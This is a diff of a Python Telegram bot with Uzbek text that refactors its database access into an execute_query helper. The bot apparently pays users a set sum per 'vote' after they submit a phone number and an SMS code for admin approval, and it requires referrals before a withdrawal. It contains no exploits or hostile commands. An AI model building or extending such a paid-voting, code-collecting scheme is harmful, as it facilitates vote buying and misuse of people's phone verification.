@@ -115,16 +115,34 @@ def db_cursor():
         if conn:
             return_db_connection(conn)
 
-def execute_with_retry(func, max_retries=3):
-    """Execute database operation with retry"""
-    for attempt in range(max_retries):
-        try:
-            return func()
-        except Exception as e:
-            if attempt == max_retries - 1:
-                raise
-            logger.warning(f"Database error (attempt {attempt + 1}): {e}")
-            time.sleep(1 * (attempt + 1))
+def execute_query(query, params=None, fetch_one=False, fetch_all=False):
+    """Execute query and return result"""
+    conn = None
+    cursor = None
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute(query, params)
+        
+        if fetch_one:
+            result = cursor.fetchone()
+        elif fetch_all:
+            result = cursor.fetchall()
+        else:
+            result = None
+            
+        conn.commit()
+        return result
+    except Exception as e:
+        if conn:
+            conn.rollback()
+        logger.error(f"Query error: {e}")
+        raise
+    finally:
+        if cursor:
+            cursor.close()
+        if conn:
+            return_db_connection(conn)
 
 # ================= HOLATLAR =================
 user_states = {}
@@ -217,7 +235,6 @@ def is_valid_phone(phone):
     if normalized.startswith('+998') and len(normalized) == 13:
         number = normalized[4:]
         if len(number) == 9 and number.isdigit():
-            # Qo'shimcha tekshiruv: operator kodlari
             operator_codes = ['90', '91', '93', '94', '95', '97', '98', '99', '88', '33']
             return number[:2] in operator_codes
     
@@ -225,11 +242,9 @@ def is_valid_phone(phone):
 
 def validate_withdrawal_info(info):
     """Yechish ma'lumotini tekshirish"""
-    # Karta raqami (16 yoki 19 xonali)
     if re.match(r'^\d{16}$', info.replace(' ', '')) or re.match(r'^\d{19}$', info.replace(' ', '')):
         return True, "card"
     
-    # Telefon raqami
     if is_valid_phone(info):
         return True, "phone"
     
@@ -239,131 +254,143 @@ def generate_referral_code():
     """Unique referral code yaratish"""
     while True:
         code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
-        with db_cursor() as cursor:
-            cursor.execute("SELECT COUNT(*) FROM users WHERE referral_code = %s", (code,))
-            if cursor.fetchone()[0] == 0:
-                return code
+        result = execute_query(
+            "SELECT COUNT(*) FROM users WHERE referral_code = %s",
+            (code,),
+            fetch_one=True
+        )
+        if result[0] == 0:
+            return code
 
 # ================= DATABASE =================
 def init_db():
     """Database jadvallarini yaratish"""
-    with db_cursor() as cursor:
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS users (
-                id SERIAL PRIMARY KEY,
-                telegram_id BIGINT UNIQUE NOT NULL,
-                phone VARCHAR(20) NOT NULL DEFAULT 'no_phone_yet',
-                balance INTEGER DEFAULT 0,
-                referral_code VARCHAR(20) UNIQUE,
-                referred_by BIGINT DEFAULT NULL,
-                is_blocked BOOLEAN DEFAULT FALSE,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS codes (
-                id SERIAL PRIMARY KEY,
-                phone VARCHAR(20) NOT NULL,
-                code VARCHAR(10) NOT NULL,
-                telegram_id BIGINT NOT NULL,
-                status VARCHAR(20) DEFAULT 'pending',
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                expires_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP + INTERVAL '5 minutes'
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS verified_phones (
-                id SERIAL PRIMARY KEY,
-                phone VARCHAR(20) UNIQUE NOT NULL,
-                telegram_id BIGINT NOT NULL,
-                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS transactions (
-                id SERIAL PRIMARY KEY,
-                telegram_id BIGINT NOT NULL,
-                amount INTEGER NOT NULL,
-                type VARCHAR(20) DEFAULT 'deposit',
-                description TEXT,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS withdraws (
-                id SERIAL PRIMARY KEY,
-                telegram_id BIGINT NOT NULL,
-                phone VARCHAR(100) NOT NULL,
-                amount INTEGER NOT NULL,
-                status VARCHAR(20) DEFAULT 'pending',
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                processed_at TIMESTAMP
-            )
-        """)
-        
-        cursor.execute("""
-            CREATE TABLE IF NOT EXISTS referrals (
-                id SERIAL PRIMARY KEY,
-                referrer_id BIGINT NOT NULL,
-                referred_id BIGINT NOT NULL UNIQUE,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
-        
-        # Indexlar
-        cursor.execute("CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id)")
-        cursor.execute("CREATE INDEX IF NOT EXISTS idx_codes_status ON codes(status)")
-        cursor.execute("CREATE INDEX IF NOT EXISTS idx_transactions_user ON transactions(telegram_id)")
-        cursor.execute("CREATE INDEX IF NOT EXISTS idx_withdraws_status ON withdraws(status)")
-        
+    queries = [
+        """
+        CREATE TABLE IF NOT EXISTS users (
+            id SERIAL PRIMARY KEY,
+            telegram_id BIGINT UNIQUE NOT NULL,
+            phone VARCHAR(20) NOT NULL DEFAULT 'no_phone_yet',
+            balance INTEGER DEFAULT 0,
+            referral_code VARCHAR(20) UNIQUE,
+            referred_by BIGINT DEFAULT NULL,
+            is_blocked BOOLEAN DEFAULT FALSE,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+        """,
+        """
+        CREATE TABLE IF NOT EXISTS codes (
+            id SERIAL PRIMARY KEY,
+            phone VARCHAR(20) NOT NULL,
+            code VARCHAR(10) NOT NULL,
+            telegram_id BIGINT NOT NULL,
+            status VARCHAR(20) DEFAULT 'pending',
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            expires_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP + INTERVAL '5 minutes'
+        )
+        """,
+        """
+        CREATE TABLE IF NOT EXISTS verified_phones (
+            id SERIAL PRIMARY KEY,
+            phone VARCHAR(20) UNIQUE NOT NULL,
+            telegram_id BIGINT NOT NULL,
+            verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+        """,
+        """
+        CREATE TABLE IF NOT EXISTS transactions (
+            id SERIAL PRIMARY KEY,
+            telegram_id BIGINT NOT NULL,
+            amount INTEGER NOT NULL,
+            type VARCHAR(20) DEFAULT 'deposit',
+            description TEXT,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+        """,
+        """
+        CREATE TABLE IF NOT EXISTS withdraws (
+            id SERIAL PRIMARY KEY,
+            telegram_id BIGINT NOT NULL,
+            phone VARCHAR(100) NOT NULL,
+            amount INTEGER NOT NULL,
+            status VARCHAR(20) DEFAULT 'pending',
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            processed_at TIMESTAMP
+        )
+        """,
+        """
+        CREATE TABLE IF NOT EXISTS referrals (
+            id SERIAL PRIMARY KEY,
+            referrer_id BIGINT NOT NULL,
+            referred_id BIGINT NOT NULL UNIQUE,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+        """,
+        "CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id)",
+        "CREATE INDEX IF NOT EXISTS idx_codes_status ON codes(status)",
+        "CREATE INDEX IF NOT EXISTS idx_transactions_user ON transactions(telegram_id)",
+        "CREATE INDEX IF NOT EXISTS idx_withdraws_status ON withdraws(status)"
+    ]
+    
+    conn = None
+    cursor = None
+    try:
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        for query in queries:
+            cursor.execute(query)
+        conn.commit()
         logger.info("✅ Database tayyor")
+    except Exception as e:
+        if conn:
+            conn.rollback()
+        logger.error(f"❌ Database init xatosi: {e}")
+        raise
+    finally:
+        if cursor:
+            cursor.close()
+        if conn:
+            return_db_connection(conn)
 
 def get_user(telegram_id):
     """Foydalanuvchi ma'lumotlarini olish"""
-    with db_cursor() as cursor:
-        cursor.execute("SELECT * FROM users WHERE telegram_id = %s", (telegram_id,))
-        return cursor.fetchone()
+    return execute_query(
+        "SELECT * FROM users WHERE telegram_id = %s",
+        (telegram_id,),
+        fetch_one=True
+    )
 
 def get_referral_count(telegram_id):
     """Referallar sonini olish"""
-    with db_cursor() as cursor:
-        cursor.execute(
-            "SELECT COUNT(*) FROM referrals WHERE referrer_id = %s",
-            (telegram_id,)
-        )
-        result = cursor.fetchone()[0]
-        return result or 0
+    result = execute_query(
+        "SELECT COUNT(*) FROM referrals WHERE referrer_id = %s",
+        (telegram_id,),
+        fetch_one=True
+    )
+    return result[0] if result else 0
 
 def is_phone_verified(phone):
     """Telefon raqam tasdiqlanganligini tekshirish"""
-    with db_cursor() as cursor:
-        cursor.execute(
-            "SELECT COUNT(*) FROM verified_phones WHERE phone = %s",
-            (phone,)
-        )
-        result = cursor.fetchone()[0]
-        return result > 0
+    result = execute_query(
+        "SELECT COUNT(*) FROM verified_phones WHERE phone = %s",
+        (phone,),
+        fetch_one=True
+    )
+    return result[0] > 0 if result else False
 
 def add_transaction(telegram_id, amount, type='deposit', description=None):
     """Tranzaksiya qo'shish"""
-    with db_cursor() as cursor:
-        cursor.execute(
-            "INSERT INTO transactions (telegram_id, amount, type, description) VALUES (%s, %s, %s, %s)",
-            (telegram_id, amount, type, description)
-        )
+    execute_query(
+        "INSERT INTO transactions (telegram_id, amount, type, description) VALUES (%s, %s, %s, %s)",
+        (telegram_id, amount, type, description)
+    )
 
 # ================= SMS YUBORISH (MOCK) =================
 async def send_sms_code(phone, code):
     """SMS kod yuborish (mock - real integratsiya qo'shish kerak)"""
-    # TODO: Real SMS xizmatiga ulash (Twilio, SMS.uz, etc.)
     logger.info(f"SMS kod {code} raqamga yuborildi: {phone}")
     
-    # Test rejimida admin'ga kodni yuborish
     if Config.TEST_MODE:
         try:
             await bot.send_message(
@@ -393,69 +420,69 @@ async def start(message: types.Message):
         return
     
     try:
-        with db_cursor() as cursor:
-            cursor.execute(
-                "INSERT INTO users (telegram_id, phone) VALUES (%s, 'no_phone_yet') "
-                "ON CONFLICT (telegram_id) DO NOTHING",
-                (telegram_id,)
+        # Foydalanuvchini qo'shish
+        execute_query(
+            "INSERT INTO users (telegram_id, phone) VALUES (%s, 'no_phone_yet') "
+            "ON CONFLICT (telegram_id) DO NOTHING",
+            (telegram_id,)
+        )
+        
+        user = get_user(telegram_id)
+        
+        if not user:
+            await message.answer("❌ Xatolik! Qaytadan urinib ko'ring.")
+            return
+        
+        if user[6]:  # is_blocked
+            await message.answer("❌ Siz bloklangansiz! Admin bilan bog'laning.")
+            return
+        
+        if not user[4]:  # referral_code
+            ref_code = generate_referral_code()
+            execute_query(
+                "UPDATE users SET referral_code = %s WHERE telegram_id = %s",
+                (ref_code, telegram_id)
             )
-            
             user = get_user(telegram_id)
+        
+        bot_info = await bot.get_me()
+        ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
+        
+        phone = user[2]
+        balance = user[3]
+        
+        if phone == "no_phone_yet" or phone is None:
+            user_states[telegram_id] = "waiting_phone"
             
-            if not user:
-                await message.answer("❌ Xatolik! Qaytadan urinib ko'ring.")
-                return
+            await message.answer(
+                f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
+                f"💰 <b>1 OVOZ = {Config.VOICE_PRICE:,} SO'M</b>\n\n"
+                f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
+                f"📝 <b>Qanday ishlaydi:</b>\n"
+                f"1️⃣ Telefon raqamingizni yuboring\n"
+                f"2️⃣ SMS kodni kiriting\n"
+                f"3️⃣ Admin tasdiqlaydi\n"
+                f"4️⃣ {Config.VOICE_PRICE:,} so'm olasiz!\n\n"
+                f"👤 <b>Sizning referal link:</b>\n"
+                f"<code>{ref_link}</code>\n\n"
+                f"📱 <b>Telefon raqamingizni yuboring:</b>",
+                reply_markup=get_phone_keyboard()
+            )
+        else:
+            phone_verified = is_phone_verified(phone)
+            ref_count = get_referral_count(telegram_id)
             
-            if user[6]:  # is_blocked
-                await message.answer("❌ Siz bloklangansiz! Admin bilan bog'laning.")
-                return
+            status_text = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
             
-            if not user[4]:  # referral_code
-                ref_code = generate_referral_code()
-                cursor.execute(
-                    "UPDATE users SET referral_code = %s WHERE telegram_id = %s",
-                    (ref_code, telegram_id)
-                )
-                user = get_user(telegram_id)
-            
-            bot_info = await bot.get_me()
-            ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
-            
-            phone = user[2]
-            balance = user[3]
-            
-            if phone == "no_phone_yet" or phone is None:
-                user_states[telegram_id] = "waiting_phone"
-                
-                await message.answer(
-                    f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
-                    f"💰 <b>1 OVOZ = {Config.VOICE_PRICE:,} SO'M</b>\n\n"
-                    f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
-                    f"📝 <b>Qanday ishlaydi:</b>\n"
-                    f"1️⃣ Telefon raqamingizni yuboring\n"
-                    f"2️⃣ SMS kodni kiriting\n"
-                    f"3️⃣ Admin tasdiqlaydi\n"
-                    f"4️⃣ {Config.VOICE_PRICE:,} so'm olasiz!\n\n"
-                    f"👤 <b>Sizning referal link:</b>\n"
-                    f"<code>{ref_link}</code>\n\n"
-                    f"📱 <b>Telefon raqamingizni yuboring:</b>",
-                    reply_markup=get_phone_keyboard()
-                )
-            else:
-                phone_verified = is_phone_verified(phone)
-                ref_count = get_referral_count(telegram_id)
-                
-                status_text = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
-                
-                await message.answer(
-                    f"👋 <b>Xush kelibsiz!</b>\n\n"
-                    f"📱 <b>Telefon:</b> {phone}\n"
-                    f"📊 <b>Holat:</b> {status_text}\n"
-                    f"💰 <b>Balans:</b> {balance:,} so'm\n"
-                    f"👥 <b>Referallar:</b> {ref_count}/{Config.MIN_REFERRALS}\n\n"
-                    f"👇 Pastdagi tugmalardan foydalaning:",
-                    reply_markup=get_user_menu()
-                )
+            await message.answer(
+                f"👋 <b>Xush kelibsiz!</b>\n\n"
+                f"📱 <b>Telefon:</b> {phone}\n"
+                f"📊 <b>Holat:</b> {status_text}\n"
+                f"💰 <b>Balans:</b> {balance:,} so'm\n"
+                f"👥 <b>Referallar:</b> {ref_count}/{Config.MIN_REFERRALS}\n\n"
+                f"👇 Pastdagi tugmalardan foydalaning:",
+                reply_markup=get_user_menu()
+            )
     except Exception as e:
         logger.error(f"❌ Start xatosi: {e}")
         await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")
@@ -473,38 +500,40 @@ async def handle_referral(message: types.Message):
     ref_code = message.text.replace('/start ref_', '')
     
     try:
-        with db_cursor() as cursor:
-            cursor.execute("SELECT telegram_id FROM users WHERE referral_code = %s", (ref_code,))
-            referer = cursor.fetchone()
+        referer = execute_query(
+            "SELECT telegram_id FROM users WHERE referral_code = %s",
+            (ref_code,),
+            fetch_one=True
+        )
+        
+        if referer and referer[0] != telegram_id:
+            execute_query(
+                "INSERT INTO users (telegram_id, phone) VALUES (%s, 'no_phone_yet') "
+                "ON CONFLICT (telegram_id) DO NOTHING",
+                (telegram_id,)
+            )
             
-            if referer and referer[0] != telegram_id:
-                cursor.execute(
-                    "INSERT INTO users (telegram_id, phone) VALUES (%s, 'no_phone_yet') "
-                    "ON CONFLICT (telegram_id) DO NOTHING",
-                    (telegram_id,)
+            try:
+                execute_query(
+                    "INSERT INTO referrals (referrer_id, referred_id) VALUES (%s, %s)",
+                    (referer[0], telegram_id)
                 )
                 
+                ref_count = get_referral_count(referer[0])
+                
                 try:
-                    cursor.execute(
-                        "INSERT INTO referrals (referrer_id, referred_id) VALUES (%s, %s)",
-                        (referer[0], telegram_id)
+                    await bot.send_message(
+                        referer[0],
+                        f"👤 <b>YANGI REFERAL!</b>\n\n"
+                        f"✅ Yana bir do'stingiz botga qo'shildi!\n"
+                        f"📊 Jami referallar: {ref_count}/{Config.MIN_REFERRALS}\n"
+                        f"🎯 Yechish uchun {Config.MIN_REFERRALS} ta kerak"
                     )
-                    
-                    ref_count = get_referral_count(referer[0])
-                    
-                    try:
-                        await bot.send_message(
-                            referer[0],
-                            f"👤 <b>YANGI REFERAL!</b>\n\n"
-                            f"✅ Yana bir do'stingiz botga qo'shildi!\n"
-                            f"📊 Jami referallar: {ref_count}/{Config.MIN_REFERRALS}\n"
-                            f"🎯 Yechish uchun {Config.MIN_REFERRALS} ta kerak"
-                        )
-                    except:
-                        pass
-                except Exception as e:
-                    if "duplicate" not in str(e).lower():
-                        logger.error(f"Referral qo'shishda xatolik: {e}")
+                except:
+                    pass
+            except Exception as e:
+                if "duplicate" not in str(e).lower():
+                    logger.error(f"Referral qo'shishda xatolik: {e}")
         
         await start(message)
     except Exception as e:
@@ -620,11 +649,10 @@ async def process_phone(message: types.Message, phone: str):
             )
             return
         
-        with db_cursor() as cursor:
-            cursor.execute(
-                "UPDATE users SET phone = %s, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
-                (phone, telegram_id)
-            )
+        execute_query(
+            "UPDATE users SET phone = %s, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
+            (phone, telegram_id)
+        )
         
         user_phones[telegram_id] = phone
         user_states[telegram_id] = "waiting_code"
@@ -662,11 +690,10 @@ async def process_phone(message: types.Message, phone: str):
             logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
         
         # Kodni saqlash
-        with db_cursor() as cursor:
-            cursor.execute(
-                "INSERT INTO codes (phone, code, telegram_id, status) VALUES (%s, %s, %s, 'pending')",
-                (phone, sms_code, telegram_id)
-            )
+        execute_query(
+            "INSERT INTO codes (phone, code, telegram_id, status) VALUES (%s, %s, %s, 'pending')",
+            (phone, sms_code, telegram_id)
+        )
         
     except Exception as e:
         logger.error(f"❌ Telefonni saqlashda xatolik: {e}")
@@ -692,32 +719,31 @@ async def receive_code(message: types.Message):
         return
     
     try:
-        with db_cursor() as cursor:
-            # Eski kodlarni yopish
-            cursor.execute(
-                "UPDATE codes SET status = 'expired' WHERE telegram_id = %s AND status = 'pending'",
-                (telegram_id,)
+        # Eski kodlarni yopish
+        execute_query(
+            "UPDATE codes SET status = 'expired' WHERE telegram_id = %s AND status = 'pending'",
+            (telegram_id,)
+        )
+        
+        # Kodni tekshirish
+        code_record = execute_query(
+            "SELECT * FROM codes WHERE phone = %s AND code = %s AND status = 'pending' AND expires_at > NOW()",
+            (phone, code),
+            fetch_one=True
+        )
+        
+        if not code_record:
+            await message.answer(
+                "❌ Noto'g'ri kod yoki kod muddati tugagan!\n"
+                "Qaytadan urinib ko'ring."
             )
-            
-            # Kodni tekshirish
-            cursor.execute(
-                "SELECT * FROM codes WHERE phone = %s AND code = %s AND status = 'pending' AND expires_at > NOW()",
-                (phone, code)
-            )
-            code_record = cursor.fetchone()
-            
-            if not code_record:
-                await message.answer(
-                    "❌ Noto'g'ri kod yoki kod muddati tugagan!\n"
-                    "Qaytadan urinib ko'ring."
-                )
-                return
-            
-            # Kodni tasdiqlashga yuborish
-            cursor.execute(
-                "UPDATE codes SET status = 'pending_verify' WHERE id = %s",
-                (code_record[0],)
-            )
+            return
+        
+        # Kodni tasdiqlashga yuborish
+        execute_query(
+            "UPDATE codes SET status = 'pending_verify' WHERE id = %s",
+            (code_record[0],)
+        )
         
         await message.answer(
             "⏳ Kodingiz qabul qilindi!\nAdmin tekshirib, tasdiqlaydi...",
@@ -768,66 +794,65 @@ async def admin_action(callback: types.CallbackQuery):
         code = data[2]
         
         try:
-            with db_cursor() as cursor:
-                cursor.execute(
-                    "SELECT * FROM codes WHERE telegram_id = %s AND code = %s AND status = 'pending_verify'",
-                    (telegram_id, code)
-                )
-                code_record = cursor.fetchone()
-                
-                if not code_record:
-                    await callback.answer("❌ Kod topilmadi!", show_alert=True)
-                    return
-                
-                cursor.execute(
-                    "SELECT expires_at < NOW() FROM codes WHERE id = %s",
+            code_record = execute_query(
+                "SELECT * FROM codes WHERE telegram_id = %s AND code = %s AND status = 'pending_verify'",
+                (telegram_id, code),
+                fetch_one=True
+            )
+            
+            if not code_record:
+                await callback.answer("❌ Kod topilmadi!", show_alert=True)
+                return
+            
+            is_expired = execute_query(
+                "SELECT expires_at < NOW() FROM codes WHERE id = %s",
+                (code_record[0],),
+                fetch_one=True
+            )[0]
+            
+            if is_expired:
+                execute_query(
+                    "UPDATE codes SET status = 'expired' WHERE id = %s",
                     (code_record[0],)
                 )
-                is_expired = cursor.fetchone()[0]
-                
-                if is_expired:
-                    cursor.execute(
-                        "UPDATE codes SET status = 'expired' WHERE id = %s",
-                        (code_record[0],)
-                    )
-                    await callback.answer("⏰ Kod muddati tugagan!", show_alert=True)
-                    return
-                
-                phone = code_record[1]
-                
-                if is_phone_verified(phone):
-                    cursor.execute(
-                        "UPDATE codes SET status = 'rejected' WHERE id = %s",
-                        (code_record[0],)
-                    )
-                    await callback.answer("❌ Bu raqam allaqachon ishlatilgan!", show_alert=True)
-                    
-                    try:
-                        await bot.send_message(
-                            telegram_id,
-                            "❌ Bu telefon raqami allaqachon ishlatilgan!",
-                            reply_markup=get_user_menu()
-                        )
-                    except:
-                        pass
-                    return
-                
-                cursor.execute(
-                    "UPDATE codes SET status = 'verified' WHERE id = %s",
+                await callback.answer("⏰ Kod muddati tugagan!", show_alert=True)
+                return
+            
+            phone = code_record[1]
+            
+            if is_phone_verified(phone):
+                execute_query(
+                    "UPDATE codes SET status = 'rejected' WHERE id = %s",
                     (code_record[0],)
                 )
+                await callback.answer("❌ Bu raqam allaqachon ishlatilgan!", show_alert=True)
                 
-                cursor.execute(
-                    "INSERT INTO verified_phones (phone, telegram_id) VALUES (%s, %s)",
-                    (phone, telegram_id)
-                )
-                
-                cursor.execute(
-                    "UPDATE users SET balance = balance + %s, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
-                    (Config.VOICE_PRICE, telegram_id)
-                )
-                
-                add_transaction(telegram_id, Config.VOICE_PRICE, 'deposit', 'Ovoz berish uchun')
+                try:
+                    await bot.send_message(
+                        telegram_id,
+                        "❌ Bu telefon raqami allaqachon ishlatilgan!",
+                        reply_markup=get_user_menu()
+                    )
+                except:
+                    pass
+                return
+            
+            execute_query(
+                "UPDATE codes SET status = 'verified' WHERE id = %s",
+                (code_record[0],)
+            )
+            
+            execute_query(
+                "INSERT INTO verified_phones (phone, telegram_id) VALUES (%s, %s)",
+                (phone, telegram_id)
+            )
+            
+            execute_query(
+                "UPDATE users SET balance = balance + %s, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
+                (Config.VOICE_PRICE, telegram_id)
+            )
+            
+            add_transaction(telegram_id, Config.VOICE_PRICE, 'deposit', 'Ovoz berish uchun')
             
             try:
                 await bot.send_message(
@@ -855,11 +880,10 @@ async def admin_action(callback: types.CallbackQuery):
         telegram_id = int(data[1])
         
         try:
-            with db_cursor() as cursor:
-                cursor.execute(
-                    "UPDATE codes SET status = 'rejected' WHERE telegram_id = %s AND status = 'pending_verify'",
-                    (telegram_id,)
-                )
+            execute_query(
+                "UPDATE codes SET status = 'rejected' WHERE telegram_id = %s AND status = 'pending_verify'",
+                (telegram_id,)
+            )
             
             try:
                 await bot.send_message(
@@ -915,12 +939,11 @@ async def show_balance(message: types.Message):
         status = "✅ Tasdiqlangan" if phone_verified else "⏳ Kutilmoqda"
         
         # Oxirgi tranzaksiyalar
-        with db_cursor() as cursor:
-            cursor.execute(
-                "SELECT * FROM transactions WHERE telegram_id = %s ORDER BY id DESC LIMIT 5",
-                (telegram_id,)
-            )
-            recent_transactions = cursor.fetchall()
+        recent_transactions = execute_query(
+            "SELECT * FROM transactions WHERE telegram_id = %s ORDER BY id DESC LIMIT 5",
+            (telegram_id,),
+            fetch_all=True
+        )
         
         transactions_text = ""
         if recent_transactions:
@@ -1070,16 +1093,15 @@ async def withdraw_info(message: types.Message):
             withdraw_states.pop(telegram_id, None)
             return
         
-        with db_cursor() as cursor:
-            cursor.execute(
-                "INSERT INTO withdraws (telegram_id, phone, amount, status) VALUES (%s, %s, %s, 'pending')",
-                (telegram_id, info, balance)
-            )
-            
-            cursor.execute(
-                "UPDATE users SET balance = 0, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
-                (telegram_id,)
-            )
+        execute_query(
+            "INSERT INTO withdraws (telegram_id, phone, amount, status) VALUES (%s, %s, %s, 'pending')",
+            (telegram_id, info, balance)
+        )
+        
+        execute_query(
+            "UPDATE users SET balance = 0, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
+            (telegram_id,)
+        )
         
         add_transaction(telegram_id, balance, 'withdraw', 'Pul yechish')
         
@@ -1134,21 +1156,20 @@ async def admin_withdraw_action(callback: types.CallbackQuery):
         amount = int(data[2])
         
         try:
-            with db_cursor() as cursor:
-                cursor.execute(
-                    "SELECT * FROM withdraws WHERE telegram_id = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
-                    (telegram_id,)
-                )
-                withdraw = cursor.fetchone()
-                
-                if not withdraw:
-                    await callback.answer("❌ So'rov topilmadi!", show_alert=True)
-                    return
-                
-                cursor.execute(
-                    "UPDATE withdraws SET status = 'completed', processed_at = CURRENT_TIMESTAMP WHERE id = %s",
-                    (withdraw[0],)
-                )
+            withdraw = execute_query(
+                "SELECT * FROM withdraws WHERE telegram_id = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
+                (telegram_id,),
+                fetch_one=True
+            )
+            
+            if not withdraw:
+                await callback.answer("❌ So'rov topilmadi!", show_alert=True)
+                return
+            
+            execute_query(
+                "UPDATE withdraws SET status = 'completed', processed_at = CURRENT_TIMESTAMP WHERE id = %s",
+                (withdraw[0],)
+            )
             
             try:
                 await bot.send_message(
@@ -1177,26 +1198,25 @@ async def admin_withdraw_action(callback: types.CallbackQuery):
         telegram_id = int(data[1])
         
         try:
-            with db_cursor() as cursor:
-                cursor.execute(
-                    "SELECT * FROM withdraws WHERE telegram_id = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
-                    (telegram_id,)
-                )
-                withdraw = cursor.fetchone()
-                
-                if not withdraw:
-                    await callback.answer("❌ So'rov topilmadi!", show_alert=True)
-                    return
-                
-                cursor.execute(
-                    "UPDATE withdraws SET status = 'rejected', processed_at = CURRENT_TIMESTAMP WHERE id = %s",
-                    (withdraw[0],)
-                )
-                
-                cursor.execute(
-                    "UPDATE users SET balance = balance + %s, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
-                    (withdraw[3], telegram_id)
-                )
+            withdraw = execute_query(
+                "SELECT * FROM withdraws WHERE telegram_id = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
+                (telegram_id,),
+                fetch_one=True
+            )
+            
+            if not withdraw:
+                await callback.answer("❌ So'rov topilmadi!", show_alert=True)
+                return
+            
+            execute_query(
+                "UPDATE withdraws SET status = 'rejected', processed_at = CURRENT_TIMESTAMP WHERE id = %s",
+                (withdraw[0],)
+            )
+            
+            execute_query(
+                "UPDATE users SET balance = balance + %s, updated_at = CURRENT_TIMESTAMP WHERE telegram_id = %s",
+                (withdraw[3], telegram_id)
+            )
             
             add_transaction(telegram_id, withdraw[3], 'refund', 'Yechish rad etildi')
             
@@ -1228,52 +1248,21 @@ async def admin_stats(message: types.Message):
         return
     
     try:
-        with db_cursor() as cursor:
-            cursor.execute("SELECT COUNT(*) FROM users")
-            total_users = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'")
-            registered_users = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'")
-            unregistered_users = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM users WHERE is_blocked = TRUE")
-            blocked_users = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM codes WHERE status = 'pending' OR status = 'pending_verify'")
-            pending = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
-            verified = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM codes WHERE status = 'rejected'")
-            rejected = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM verified_phones")
-            verified_phones = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COALESCE(SUM(balance), 0) FROM users")
-            total_balance = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM withdraws WHERE status = 'pending'")
-            pending_withdraws = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM withdraws WHERE status = 'completed'")
-            completed_withdraws = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COALESCE(SUM(amount), 0) FROM withdraws WHERE status = 'completed'")
-            total_withdrawn = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM referrals")
-            total_referrals = cursor.fetchone()[0]
-            
-            # Bugungi statistika
-            cursor.execute("SELECT COUNT(*) FROM users WHERE created_at::date = CURRENT_DATE")
-            today_users = cursor.fetchone()[0]
-            
-            cursor.execute("SELECT COUNT(*) FROM codes WHERE created_at::date = CURRENT_DATE AND status = 'verified'")
-            today_verified = cursor.fetchone()[0]
+        total_users = execute_query("SELECT COUNT(*) FROM users", fetch_one=True)[0]
+        registered_users = execute_query("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'", fetch_one=True)[0]
+        unregistered_users = execute_query("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'", fetch_one=True)[0]
